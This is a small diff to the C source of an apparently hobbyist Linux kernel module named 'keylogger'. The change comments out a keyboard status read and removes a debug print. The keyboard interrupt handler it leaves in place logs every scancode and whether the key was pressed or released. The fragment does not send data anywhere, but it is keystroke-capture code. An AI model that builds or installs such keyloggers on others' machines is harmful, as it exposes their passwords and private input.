@@ -79,11 +79,11 @@ static int		create_file(const char *name, umode_t mode, struct file_operations *
 
 static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id)
 {
-	unsigned char status, scancode;
+	unsigned char /*status, */scancode;
 
-	status = inb(KEYBOARD_STATUS);
+//	status = inb(KEYBOARD_STATUS);
 	scancode = inb(KEYBOARD_DATA);
-	kbd_buffer = (unsigned short) ((status << 8) | (scancode & 0x00ff));
+//	kbd_buffer = (unsigned short) ((status << 8) | (scancode & 0x00ff));
 	printk(KERN_INFO "Scan Code %x %s\n",
             scancode & KBD_SCANCODE_MASK,
             scancode & KBD_STATUS_MASK ? "Released" : "Pressed");
@@ -111,8 +111,6 @@ static int		__init keylogger_init(void)
 		printk(KERN_INFO "something went wrong in request_irq\n");
 		return -EIO;
 	}
-	printk(KERN_INFO "keylogger: kbd_buffer -> [%d]\n", kbd_buffer);
-
 	return 0;
 }
 
